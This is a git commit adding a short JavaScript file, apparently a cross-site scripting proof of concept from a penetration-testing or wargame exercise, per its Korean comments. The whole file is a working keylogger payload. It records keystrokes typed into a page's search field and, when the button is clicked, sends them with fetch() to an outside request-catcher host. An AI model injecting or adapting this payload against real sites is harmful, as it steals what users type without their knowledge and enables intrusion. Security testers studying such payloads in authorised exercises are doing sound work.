eb929d23a6acda99ea83ea689ed7344c30eb5dce
JUNG SOON HO <ajsoon98@naver.com>
2025-12-29 10:41:34 +0900

    Create Keylogger2.js

---
+++ XSS_POC/Keylogger/Keylogger2.js
@@ -0,0 +1,16 @@
+// 글 제목 부분에 입력하면 검색어를 탈취할 수 있다.
+// 모의해킹 점검 중 9
+const search_word = document.getElementsByName("search_word")[0];
+
+var search_keylog = "";
+
+search_word.addEventListener("keyup", () => {
+    search_keylog += event.key;
+});
+
+const search_btn = document.getElementsByTagName("button")[0];
+
+search_btn.addEventListener('click', () => {
+    fetch("https://jperuml.request.dreamhack.games?k=" + search_keylog);
+    key = "";
+})
